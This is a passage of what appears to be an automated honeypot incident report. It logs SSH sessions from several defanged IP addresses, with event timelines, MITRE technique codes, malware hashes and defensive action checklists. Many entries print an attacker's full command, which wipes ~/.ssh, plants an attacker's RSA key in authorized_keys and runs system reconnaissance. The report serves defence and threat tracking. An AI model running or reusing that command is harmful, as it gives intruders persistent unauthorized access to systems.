| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, uname -m, cat /proc/cpuinfo | grep model | grep name | wc -l` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 15:07:39` | `cowrie.session.connect` |
| `2026-06-01 15:07:40` | `cowrie.client.version` |
| `2026-06-01 15:07:41` | `cowrie.client.kex` |
| `2026-06-01 15:07:42` | `cowrie.login.success` |
| `2026-06-01 15:07:42` | `cowrie.session.params` |
| `2026-06-01 15:07:42` | `cowrie.command.input` |
| `2026-06-01 15:07:42` | `cowrie.command.failed` |
| `2026-06-01 15:07:42` | `cowrie.log.closed` |
| `2026-06-01 15:07:42` | `cowrie.session.params` |
| `2026-06-01 15:07:42` | `cowrie.command.input` |
| `2026-06-01 15:07:42` | `cowrie.session.file_download` |
| `2026-06-01 15:07:42` | `cowrie.log.closed` |
| `2026-06-01 15:07:55` | `cowrie.session.params` |
| `2026-06-01 15:07:55` | `cowrie.command.input` |
| `2026-06-01 15:08:41` | `cowrie.log.closed` |
| `2026-06-01 15:08:42` | `cowrie.session.params` |
| `2026-06-01 15:08:42` | `cowrie.command.input` |
| `2026-06-01 15:08:42` | `cowrie.log.closed` |
| `2026-06-01 15:08:42` | `cowrie.session.params` |
| `2026-06-01 15:08:42` | `cowrie.command.input` |
| `2026-06-01 15:08:42` | `cowrie.log.closed` |
| `2026-06-01 15:08:43` | `cowrie.session.params` |
| `2026-06-01 15:08:43` | `cowrie.command.input` |
| `2026-06-01 15:08:43` | `cowrie.log.closed` |
| `2026-06-01 15:08:43` | `cowrie.session.params` |
| `2026-06-01 15:08:43` | `cowrie.command.input` |
| `2026-06-01 15:08:43` | `cowrie.log.closed` |
| `2026-06-01 15:08:44` | `cowrie.session.params` |
| `2026-06-01 15:08:44` | `cowrie.command.input` |
| `2026-06-01 15:08:44` | `cowrie.log.closed` |
| `2026-06-01 15:08:44` | `cowrie.session.params` |
| `2026-06-01 15:08:44` | `cowrie.command.input` |
| `2026-06-01 15:08:44` | `cowrie.log.closed` |
| `2026-06-01 15:08:45` | `cowrie.session.params` |
| `2026-06-01 15:08:45` | `cowrie.command.input` |
| `2026-06-01 15:08:45` | `cowrie.log.closed` |
| `2026-06-01 15:08:45` | `cowrie.session.params` |
| `2026-06-01 15:08:45` | `cowrie.command.input` |
| `2026-06-01 15:08:45` | `cowrie.log.closed` |
| `2026-06-01 15:08:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.1.87[.]115` to AbuseIPDB if not already reported
- [ ] Block `120.1.87[.]115` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b321e8100945

| Field | Detail |
|---|---|
| **Source IP** | `186.248.197[.]77` |
| **First Seen** | 2026-06-01 15:07 |
| **Last Seen** | 2026-06-01 15:07 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 15:07:44` | `cowrie.session.connect` |
| `2026-06-01 15:07:44` | `cowrie.client.version` |
| `2026-06-01 15:07:44` | `cowrie.client.kex` |
| `2026-06-01 15:07:46` | `cowrie.login.success` |
| `2026-06-01 15:07:46` | `cowrie.session.params` |
| `2026-06-01 15:07:46` | `cowrie.command.input` |
| `2026-06-01 15:07:46` | `cowrie.command.failed` |
| `2026-06-01 15:07:47` | `cowrie.log.closed` |
| `2026-06-01 15:07:48` | `cowrie.session.params` |
| `2026-06-01 15:07:48` | `cowrie.command.input` |
| `2026-06-01 15:07:48` | `cowrie.session.file_download` |
| `2026-06-01 15:07:48` | `cowrie.log.closed` |
| `2026-06-01 15:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.197[.]77` to AbuseIPDB if not already reported
- [ ] Block `186.248.197[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d79b82101f9

| Field | Detail |
|---|---|
| **Source IP** | `186.248.197[.]77` |
| **First Seen** | 2026-06-01 15:07 |
| **Last Seen** | 2026-06-01 15:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 15:07:52` | `cowrie.session.connect` |
| `2026-06-01 15:07:52` | `cowrie.client.version` |
| `2026-06-01 15:07:52` | `cowrie.client.kex` |
| `2026-06-01 15:07:54` | `cowrie.login.success` |
| `2026-06-01 15:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.197[.]77` to AbuseIPDB if not already reported
- [ ] Block `186.248.197[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af7a73d92c22

| Field | Detail |
|---|---|
| **Source IP** | `186.248.197[.]77` |
| **First Seen** | 2026-06-01 15:11 |
| **Last Seen** | 2026-06-01 15:11 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 15:11:19` | `cowrie.session.connect` |
| `2026-06-01 15:11:19` | `cowrie.client.version` |
| `2026-06-01 15:11:20` | `cowrie.client.kex` |
| `2026-06-01 15:11:21` | `cowrie.login.success` |
| `2026-06-01 15:11:22` | `cowrie.session.params` |
| `2026-06-01 15:11:22` | `cowrie.command.input` |
| `2026-06-01 15:11:22` | `cowrie.command.failed` |
| `2026-06-01 15:11:23` | `cowrie.log.closed` |
| `2026-06-01 15:11:23` | `cowrie.session.params` |
| `2026-06-01 15:11:23` | `cowrie.command.input` |
| `2026-06-01 15:11:24` | `cowrie.session.file_download` |
| `2026-06-01 15:11:24` | `cowrie.log.closed` |
| `2026-06-01 15:11:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.197[.]77` to AbuseIPDB if not already reported
- [ ] Block `186.248.197[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcff8411bcae

| Field | Detail |
|---|---|
| **Source IP** | `186.248.197[.]77` |
| **First Seen** | 2026-06-01 15:11 |
| **Last Seen** | 2026-06-01 15:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 15:11:28` | `cowrie.session.connect` |
| `2026-06-01 15:11:28` | `cowrie.client.version` |
| `2026-06-01 15:11:28` | `cowrie.client.kex` |
| `2026-06-01 15:11:30` | `cowrie.login.success` |
| `2026-06-01 15:11:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.197[.]77` to AbuseIPDB if not already reported
- [ ] Block `186.248.197[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95b28b48ba3c

| Field | Detail |
|---|---|
| **Source IP** | `186.248.197[.]77` |
| **First Seen** | 2026-06-01 15:14 |
| **Last Seen** | 2026-06-01 15:15 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 15:14:57` | `cowrie.session.connect` |
| `2026-06-01 15:14:57` | `cowrie.client.version` |
| `2026-06-01 15:14:58` | `cowrie.client.kex` |
| `2026-06-01 15:14:59` | `cowrie.login.success` |
| `2026-06-01 15:15:00` | `cowrie.session.params` |
| `2026-06-01 15:15:00` | `cowrie.command.input` |
| `2026-06-01 15:15:00` | `cowrie.command.failed` |
| `2026-06-01 15:15:01` | `cowrie.log.closed` |
| `2026-06-01 15:15:01` | `cowrie.session.params` |
| `2026-06-01 15:15:01` | `cowrie.command.input` |
| `2026-06-01 15:15:02` | `cowrie.session.file_download` |
| `2026-06-01 15:15:02` | `cowrie.log.closed` |
| `2026-06-01 15:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.197[.]77` to AbuseIPDB if not already reported
- [ ] Block `186.248.197[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e521eef5a47b

| Field | Detail |
|---|---|
| **Source IP** | `186.248.197[.]77` |
| **First Seen** | 2026-06-01 15:15 |
| **Last Seen** | 2026-06-01 15:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 15:15:06` | `cowrie.session.connect` |
| `2026-06-01 15:15:06` | `cowrie.client.version` |
| `2026-06-01 15:15:06` | `cowrie.client.kex` |
| `2026-06-01 15:15:08` | `cowrie.login.success` |
| `2026-06-01 15:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.197[.]77` to AbuseIPDB if not already reported
- [ ] Block `186.248.197[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acd63fb137c0

| Field | Detail |
|---|---|
| **Source IP** | `186.248.197[.]77` |
| **First Seen** | 2026-06-01 15:18 |
| **Last Seen** | 2026-06-01 15:18 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 15:18:30` | `cowrie.session.connect` |
| `2026-06-01 15:18:30` | `cowrie.client.version` |
| `2026-06-01 15:18:30` | `cowrie.client.kex` |
| `2026-06-01 15:18:32` | `cowrie.login.success` |
| `2026-06-01 15:18:32` | `cowrie.session.params` |
| `2026-06-01 15:18:32` | `cowrie.command.input` |
| `2026-06-01 15:18:32` | `cowrie.command.failed` |
| `2026-06-01 15:18:33` | `cowrie.log.closed` |
| `2026-06-01 15:18:34` | `cowrie.session.params` |
| `2026-06-01 15:18:34` | `cowrie.command.input` |
| `2026-06-01 15:18:34` | `cowrie.session.file_download` |
| `2026-06-01 15:18:34` | `cowrie.log.closed` |
| `2026-06-01 15:18:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.197[.]77` to AbuseIPDB if not already reported
- [ ] Block `186.248.197[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38209a5b2a11

| Field | Detail |
|---|---|
| **Source IP** | `186.248.197[.]77` |
| **First Seen** | 2026-06-01 15:18 |
| **Last Seen** | 2026-06-01 15:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 15:18:38` | `cowrie.session.connect` |
| `2026-06-01 15:18:38` | `cowrie.client.version` |
| `2026-06-01 15:18:39` | `cowrie.client.kex` |
| `2026-06-01 15:18:40` | `cowrie.login.success` |
| `2026-06-01 15:18:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.197[.]77` to AbuseIPDB if not already reported
- [ ] Block `186.248.197[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c2ca550f10a

| Field | Detail |
|---|---|
| **Source IP** | `43.243.142[.]42` |
| **First Seen** | 2026-06-01 15:22 |
| **Last Seen** | 2026-06-01 15:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 15:22:18` | `cowrie.session.connect` |
| `2026-06-01 15:22:18` | `cowrie.client.version` |
| `2026-06-01 15:22:18` | `cowrie.client.kex` |
| `2026-06-01 15:22:19` | `cowrie.login.success` |
| `2026-06-01 15:22:19` | `cowrie.session.params` |
| `2026-06-01 15:22:19` | `cowrie.command.input` |
| `2026-06-01 15:22:19` | `cowrie.command.failed` |
| `2026-06-01 15:22:19` | `cowrie.log.closed` |
| `2026-06-01 15:22:19` | `cowrie.session.params` |
| `2026-06-01 15:22:19` | `cowrie.command.input` |
| `2026-06-01 15:22:19` | `cowrie.session.file_download` |
| `2026-06-01 15:22:19` | `cowrie.log.closed` |
| `2026-06-01 15:22:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.243.142[.]42` to AbuseIPDB if not already reported
- [ ] Block `43.243.142[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b915c054573d

| Field | Detail |
|---|---|
| **Source IP** | `43.243.142[.]42` |
| **First Seen** | 2026-06-01 15:22 |
| **Last Seen** | 2026-06-01 15:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 15:22:21` | `cowrie.session.connect` |
| `2026-06-01 15:22:21` | `cowrie.client.version` |
| `2026-06-01 15:22:21` | `cowrie.client.kex` |
| `2026-06-01 15:22:21` | `cowrie.login.success` |
| `2026-06-01 15:22:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.243.142[.]42` to AbuseIPDB if not already reported
- [ ] Block `43.243.142[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8891a60f8c6

| Field | Detail |
|---|---|
| **Source IP** | `43.243.142[.]42` |
| **First Seen** | 2026-06-01 15:25 |
| **Last Seen** | 2026-06-01 15:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 15:25:48` | `cowrie.session.connect` |
| `2026-06-01 15:25:48` | `cowrie.client.version` |
| `2026-06-01 15:25:48` | `cowrie.client.kex` |
| `2026-06-01 15:25:49` | `cowrie.login.success` |
| `2026-06-01 15:25:49` | `cowrie.session.params` |
| `2026-06-01 15:25:49` | `cowrie.command.input` |
| `2026-06-01 15:25:49` | `cowrie.command.failed` |
| `2026-06-01 15:25:49` | `cowrie.log.closed` |
| `2026-06-01 15:25:49` | `cowrie.session.params` |
| `2026-06-01 15:25:49` | `cowrie.command.input` |
| `2026-06-01 15:25:49` | `cowrie.session.file_download` |
| `2026-06-01 15:25:49` | `cowrie.log.closed` |
| `2026-06-01 15:25:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.243.142[.]42` to AbuseIPDB if not already reported
- [ ] Block `43.243.142[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cba50236079b

| Field | Detail |
|---|---|
| **Source IP** | `43.243.142[.]42` |
| **First Seen** | 2026-06-01 15:25 |
| **Last Seen** | 2026-06-01 15:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 15:25:51` | `cowrie.session.connect` |
| `2026-06-01 15:25:51` | `cowrie.client.version` |
| `2026-06-01 15:25:51` | `cowrie.client.kex` |
| `2026-06-01 15:25:51` | `cowrie.login.success` |
| `2026-06-01 15:25:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.243.142[.]42` to AbuseIPDB if not already reported
- [ ] Block `43.243.142[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c16c97d6d4f

| Field | Detail |
|---|---|
| **Source IP** | `43.243.142[.]42` |
| **First Seen** | 2026-06-01 15:29 |
| **Last Seen** | 2026-06-01 15:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 15:29:23` | `cowrie.session.connect` |
| `2026-06-01 15:29:23` | `cowrie.client.version` |
| `2026-06-01 15:29:23` | `cowrie.client.kex` |
| `2026-06-01 15:29:24` | `cowrie.login.success` |
| `2026-06-01 15:29:24` | `cowrie.session.params` |
| `2026-06-01 15:29:24` | `cowrie.command.input` |
| `2026-06-01 15:29:24` | `cowrie.command.failed` |
| `2026-06-01 15:29:24` | `cowrie.log.closed` |
| `2026-06-01 15:29:24` | `cowrie.session.params` |
| `2026-06-01 15:29:24` | `cowrie.command.input` |
| `2026-06-01 15:29:24` | `cowrie.session.file_download` |
| `2026-06-01 15:29:24` | `cowrie.log.closed` |
| `2026-06-01 15:29:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.243.142[.]42` to AbuseIPDB if not already reported
- [ ] Block `43.243.142[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2072839dec4d

| Field | Detail |
|---|---|
| **Source IP** | `43.243.142[.]42` |
| **First Seen** | 2026-06-01 15:29 |
| **Last Seen** | 2026-06-01 15:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 15:29:26` | `cowrie.session.connect` |
| `2026-06-01 15:29:26` | `cowrie.client.version` |
| `2026-06-01 15:29:26` | `cowrie.client.kex` |
| `2026-06-01 15:29:26` | `cowrie.login.success` |
| `2026-06-01 15:29:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.243.142[.]42` to AbuseIPDB if not already reported
- [ ] Block `43.243.142[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5128b8acb39c

| Field | Detail |
|---|---|
| **Source IP** | `202.165.22[.]58` |
| **First Seen** | 2026-06-01 16:06 |
| **Last Seen** | 2026-06-01 16:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
